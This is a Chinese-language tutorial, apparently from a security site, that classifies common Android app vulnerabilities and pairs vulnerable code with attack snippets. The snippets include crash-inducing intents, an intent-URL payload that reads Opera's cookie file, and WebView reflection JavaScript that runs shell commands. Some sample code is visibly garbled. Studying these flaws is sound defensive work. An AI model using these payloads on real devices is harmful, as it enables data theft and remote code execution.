@@ -1,0 +1,306 @@
+**导言**
+
+近些年来，基于Android平台的应用开发呈现出快速增长的趋势。但是由于Android开发人员缺乏安全意识，在程序设计上存在各种缺陷，同时国内Android应用市场缺乏有效的统一管理机制，应用安全质量难以保证，应用安全漏洞数量逐年增加。
+
+因此，Android应用漏洞挖掘引起了越来越多研究者的关注。本文基于此，搜集了前人挖掘Android应用漏洞的经验，归纳出Android常见应用漏洞的分类及原理，意在向安全研究者介绍Android应用上的缺陷。
+
+ **四大组件**
+
+四大组件的安全问题很大一部分是组件设置成导出状态（android:exported=true）引起的。导出状态就意味着当前组件可以被另一个Application的组件启动，容易造成异常，导致程序Crash。
+
+ **Android应用本地拒绝服务漏洞**
+
+ **描述：**
+
+Android系统提供了Activity、Service 和 Broadcast Receiver
+等组件，并提供了Intent机制来协助应用间的交互与通讯，Intent负责对应用中一次操作的动作、动作涉及数据、附加数据进行描述，Android系统则根据此Intent的描述，负责找到对应的组件，将Intent传递给调用的组件，并完成组件的调用。Android应用本地拒绝服务漏洞源于程序没有对Intent.getXXXExtra()获取的异常或者畸形数据处理时没有进行异常捕获，从而导致攻击者可通过向受害者应用发送此类空数据、异常或者畸形数据来达到使该应用Crash的目的，简单的说就是攻击者通过Intent发送空数据、异常或畸形数据给受害者应用，导致其崩溃。
+
+本地拒绝服务漏洞不仅可以导致安全防护等应用的防护功能被绕过或失效（如杀毒应用、安全卫士、防盗锁屏等），而且也可以被竞争方利用攻击，使得自己的应用崩溃，造成不同程度的经济利益损失。
+
+ **背景知识：**
+
+Android系统中的Intent机制负责对应用中一次操作的动作、动作涉及数据、附加数据进行描述，系统则根据此Intent的描述，负责找到对应的组件，将Intent传递给调用的组件，并完成组件的调用。
+
+ **产生原理：**
+
+源于程序处理Intent.getxxxExtra()获取的数据时没有进行异常捕获，从而导致攻击者可通过向受害者应用发送此类空数据，异常来使得程序Crash。
+
+ **攻击代码示例：**
+
+ **01 NullPonterException异常**
+
+源于程序没有对getAction()等获取到的数据进行空指针判断，导致空指针异常，从而使得应用崩溃。
+
+    
+    
+    //漏洞应用代码片段：
+    Intent i = new Intent();
+    if (i.getAction().equals("TestForNullPointerException")) {
+        Log.d("TAG", "Test for Android Refuse Service Bug");
+    }
+    //攻击应用代码片段：
+    adb shell am start -n com.alibaba.jaq.pocforrefuseservice/.MainActivity
+
+ **02 ClassCastException异常**
+
+源于程序没有对getSerializableExtra()等获取到的数据进行类型判断而进行强制类型转换，导致类型转换异常而导致应用崩溃。
+
+    
+    
+    //漏洞应用代码片段：
+    Intent i = getIntent();
+    String test = (String)i.getSerializableExtra("serializable_key");
+    
+    //攻击应用代码片段：
+    Intent i = new Intent();
+    i.setClassName("com.alibaba.jaq.pocforrefuseservice", "com.alibaba.jaq.pocforrefuseservice.MainActivity");
+    i.putExtra("serializable_key", BigInteger.valueOf(1));
+    startActivity(i)
+
+ **03 IndexoutofBoundException异常**
+
+源于程序没有对getIntegerArrayListExtra()等获取到的数据数组元素大小的判断，导致数组访问越界而导致应用崩溃。
+
+    
+    
+    //漏洞应用代码片段：
+    Intent intent = getIntent();
+    ArrayList<Integer> intArray = intent.getIntegerArrayListExtra("user_id");
+    if (intArray != null) {
+        for (int i = 0; i < USER_NUM; i++) {
+            intArray.get(i);
+        }
+    }
+    //攻击应用代码片段
+    Intent intent = new Intent();
+    intent.setClassName("com.alibaba.jaq.pocforrefuseservice", "com.alibaba.jaq.pocforrefuseservice.MainActivity");
+    ArrayList<Integer> user_id = new ArrayList<Integer>();
+    intent.putExtra("user_id", user_id);
+    startActivity(intent);
+
+ **04** **ClassNotFoundException异常**
+
+源于程序无法找到从getSerializableExtra()获取到的序列化类对象的类定义，因此发生类未定义的异常而导致应用崩溃。
+
+    
+    
+    //漏洞应用代码片段：
+    Intent i = getIntent();
+    i.getSerializableExtra("serializable_key")
+    //攻击应用代码片段：
+    public void onCreate(Bundle savedInstanceState) {
+         super.onCreate(savedInstanceState);
+         setContentView(R.layout.main);
+         Intent i = new Intent();
+         i.setClassName("com.alibaba.jaq.pocforrefuseservice", "com.alibaba.jaq.pocforrefuseservice.MainActivity");
+         i.putExtra("serializable_key", new SelfSerializableData());
+         startActivity(i);
+     }
+    static  class SelfSerializableData implements Serializable {
+         private static final long serialVersionUID = 42L;
+         public SelfSerializableData() {
+             super();
+         }
+     }
+
+ **ContentProvider uri注入**
+
+ **相关的漏洞：** CVE-2019-14339
+
+ **示例代码：**
+
+    
+    
+    缺陷代码：
+    protected void onCreate(Bundle savedInstanceState){
+          su(per.onCreate(savedIn);
+          setContentView(R.laylout.activity_main);//加载布局文件
+          EditText et = (EditText) this.findViewById(R.id.iptext);//)找到对应的EditText控件
+          String msgId = et.getText().toString().trim();//获得edittext输入的值
+          Uri dataUri = Uri.parse(WeatherContentProvider.CONTENT_URI + "/" + msgId);//Uri.parse()方法返回的是一个 URI 类型，通过这个URI可以访问一个网络或者是本地的资源
+          Cursor cursor = getContentResolver.query(dataUri,null,null,null,null); 
+             /*   getContentResolver() 方法会返回一个 ContentResolver 对象，这个对象是内容解析器，Android中程序间数据的共享是通过 Provider/Resolver 进行的。提供内容的就叫Provider，Resovler 提供接口对提供的内容进行解读。返回的对象调用query() 方法来按照用户输入的内容进行查询。
+          */
+    }
+
+上述代码片段中，程序中未校验用户输入的内容，且程序动态构建查询URI拼接字符串。攻击者可通过向msgId代码提供值deleted调用content://my.authority/messages/deleted来改变查询的意义。
+
+ **Intent Scheme Url攻击**
+
+ **描述：**
+
+Intent scheme url是一种用于在web页面中启动终端App activity的特殊URL，Intent scheme
+url的引入虽然带来了一定的便捷性，但从另外一方面看，给恶意攻击页面通过Intent-based攻击终端上已安装应用提供了便利。
+
+ **背景知识：**
+
+    
+    
+    一个Intent scheme url的使用示例
+    <script>
+    location.href = "intent:mydata1#Intent;action=myaction1;type=text/plaint;end"
+    </script>
+
+如果浏览器支持Intent scheme
+url，在加载了web页面后，将根据url生成一个Intent，并尝试通过Intent打来指定的activity。具体步骤如下：
+
+根据url生成对应的Intent object,
+
+Intent intent = Intent.parseUri(url);
+
+    
+    
+    HOST/URI-path // Optional host
+       #Intent;
+          package=[string];
+          action=[string];
+          category=[string];
+          component=[string];
+          scheme=[string];
+       end;
+
+后Intent过滤，为了安全起见，很多浏览器对step1中的Intent object进行过滤，以抵御Intent-based攻击。
+
+最后组件调用：
+
+浏览器中一般使用Context#startActivityIfNeeded()或者Context#startActivity()方法实现。
+
+ **攻击原理：**
+
+1.浏览器攻击
+
+因为Intent是浏览器依据url生成并以浏览器自己的身份发送的，因此攻击者恶意页面中的Intent scheme
+url不仅可以调起导出组件，还可以调起私有组件。
+
+2.终端上安装的任意APP
+
+Intent-based攻击一般是通过终端上安装的恶意App来实现的，但通过浏览器加载包含特定Intent scheme
+url的恶意页面，可以实现对终端上安装的任意App远程Intent-based攻击的效果。在2013年东京的Pwn2Own上比赛上，次攻击方式被应用于攻陷三星Samsung Galaxy S4。
+
+ **攻击示例：** **Opera mobile for Android cookie theft**
+
+opera浏览器中缺少Intent过滤步骤，一次可以通过恶意页面中的Intent scheme
+url调起浏览器的任意activity，包括私有的activity，通过如下攻击代码可以获取到Opera浏览器的cookie：
+
+    
+    
+    <script>
+    location.href = "intent:#Intent;S.url=file:///data/data/com.opera.browser/app_opera/cookies;component=
+    com.opera.browser/com.admarvel.android.ads.AdMarvelActivity;end";
+
+"com.admarvel.android.ads.AdMarvelActivity"是Opera浏览器的私有组件，"url=file:///data/data/com.opera.browser/app_opera/cookies"是Opera浏览器cookie文件的存放位置。
+
+ **Webview漏洞**
+
+ **描述：**
+
+Android API level
+16以及之前的版本存在远程代码执行的漏洞，这个漏洞源于程序没有正确的限制使用WebView.addJavascriptInterface方法，远程攻击者可通过使用Java
+Reflection API利用该漏洞执行任意Java对象的方法，简单来说就是通过addJavascriptInterface给WebView加入一个
+JavaScript桥接接口，App使用webview加载网页时，JavaScript 通过调用这个接口可以直接操作本地App的JAVA接口。
+
+![](https://image.3001.net/images/20210512/1620831827_609bee532d76040dcde37.jpg!small)
+
+ **远程代码执行漏洞**
+
+ **01** **CVE-2012-6636**
+
+ **产生原因：**
+
+Android API level
+17以及之前的系统版本，由于程序没有正确限制使用addJavascriptInterface方法，远程攻击者可通过使用Java Reflection
+API利用该漏洞执行任意Java对象的方法。通过addJavascriptInterface给WebView加入一个JavaScript桥接接口，JavaScript通过调用这个接口可以直接与本地的Java接口进行交互。就有可能出现手机被安装木马程序、发送扣费短信、通信录和短信被窃取、获取本地设备的SD卡中的文件等信息，从而造成信息泄露，甚至手机被远程控制等安全问题。
+
+    
+    
+    webview.addJavascriptInterface(new MyJavaScriptInterface(),"myandroid");
+    arg1:android的本地对象
+    arg2: js的对象
+
+当js拿到android对象后，通过java反射机制,就可以调用这个android对象中所有的方法，包括（java.lang.runtime类），任意代码执行。
+
+    
+    
+    function execute(cmdArgs)
+    {
+            for (var obj in window) {
+                console.log(obj);
+                if ("getClass" in window[obj]) {
+                    alert(obj);
+                    return window[obj].getClass().forName("java.lang.Runtime").
+                        getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
+                 }
+             }
+           } 
+          //从执行命令后返回的输入流中得到字符串，
+          从而得到文件名的信息,有很严重暴露隐私的危险。
+          var p = execute(["ls","/mnt/sdcard/"]);
+          document.write(getInputStream2String(p.getInputStream()));
+    
+
+**02** **CVE-2014-1939**
+
+java/android/webkit/BrowserFrame.java使用addJavascriptInterface API并创建了
+SearchBoxImpl类的对象。攻击者可通过访问searchBoxJavaBridge_ 接口利用该漏洞执行任意 Java 代码。
+
+Google Android <= 4.3.1 受到此漏洞的影响。
+
+ **03** **CVE-2014-7224**
+
+所有由系统提供的WebView都会被加入两个JS objects，分别为是accessibility
+和accessibilityTraversal。恶意攻击者就可以使用accessibility 和accessibilityTraversal这两个
+Java Bridge来执行远程攻击代码。
+
+Google Android < 4.4 受到此漏洞的影响。
+
+ **密码明文存储漏洞**
+
+    
+    
+    webview.setSavePassword(true);开启后，在用户输入密码时，会弹出提示框：询问用户是否保存密码；如果选择”是”，密码会被明文保到 /data/data/com.package.name/databases/webview.db 中，这样就有被盗取密码的危险
+
+ **域控制不严格漏洞**
+
+ **描述：**
+
+当其他的应用启动Activity时，Intent中的data会被当作url加载（假定传进file:///data/local/tmp/attack.html），通过其他APP使用显式ComponentName或者其他类似方式就可以很轻松的启动该WebViewActivity，我们知道因为Android中的
+sandbox，Android中的各应用是相互隔离的，在一般情况下A应用是不能访问B应用的文件的，但不正确的使用WebView可能会打破这种隔离，从而带来应用数据泄露的威胁，即A应用可以通过B应用导出的Activity让B应用加载一个恶意的file协议的url，从而可以获取
+B 应用的内部私有文件。
+
+    
+    
+    public class WebViewActivity extends Activity {private WebView webView;public void onCreate(Bundle savedInstanceState) {super.onCreate(savedInstanceState);setContentView(R.layout.activity_webview);webView = (WebView) findViewById(R.id.webView);//webView.getSettings().setAllowFileAccess(false);                    (1)//webView.getSettings().setAllowFileAccessFromFileURLs(true);         (2)//webView.getSettings().setAllowUniversalAccessFromFileURLs(true);    (3)Intent intent = getIntent();String url = intent.getData().toString(); webView.loadUrl(url);}}
+
+A应用可以通过B应用导出一个Activity（
+android:exported="true"），让B应用加载出一个恶意的file协议的url，从而可以获取B应用的内部私有文件，从而带来数据泄露威胁。
+
+ **数据存储**
+
+ **Man in the disk攻击**
+
+ **描述：**
+
+当App使用外部存储不多加小心时，才使得Man-in-the-Disk攻击成为可能。外部存储是一种在所有App之间共享的资源，并且不享受Android内置的沙盒保护。如果App本身在使用外部资源时未能使用安全预防措施，App就容易遭受恶意数据操纵的攻击。
+
+ **背景知识：**
+
+在Android操作系统中，有两种存储类型：内部存储，每个App单独使用并由Android沙箱进行隔离；外部存储，一般指SD卡或存储设备中的逻辑分区，由所有App共享使用。实际上，外部存储主要用于在App之间或与PC共享文件。例如，某通讯App为了分享手机相册中的照片，App需要访问外部存储中保存的媒体文件。
+
+ **产生原理：**
+
+App从App提供商的服务器下载。更新或接受数据，这些数据在发送到App本身之前会通过外部存储，攻击者可以在App再次读取之前操纵外部存储中保存的数据来使得提权，使得程序Crash。
+
+![](https://image.3001.net/images/20210512/1620832008_609bef080fc4eaeb8a675.png!small)
+
+ **全局可读写漏洞**
+
+ **描述：**
+
+在创建SharedPreference时，将数据库设置了全局的可读权限，攻击者恶意读取SharedPreference内容，获取敏感信息。在设置SharedPreference属性时如果设置全局可写，攻击者可能会篡改、伪造内容。
+
+    
+    
+    ...SharedPreferences readPreferences = getSharedPreferences("read_preferences",Context.MODE_WORLD_READABLE);SharedPreferences writePreferences = getSharedPreferences("write_preferences",Context.MODE_WORLD_WRITEABLE);SharedPreferences.Editor editor = readPreferences.edit();editor.putString("name", "Niko");editor.putString("password", "autoref");editor.commit();...
+
+创建SharedPreference时，调用openOrCreateDatabase，并将访问权限设置MODE_WORLD_READABLE或者MODE_WORLD_WRITEABLE，设备被root也可进行读写。
+
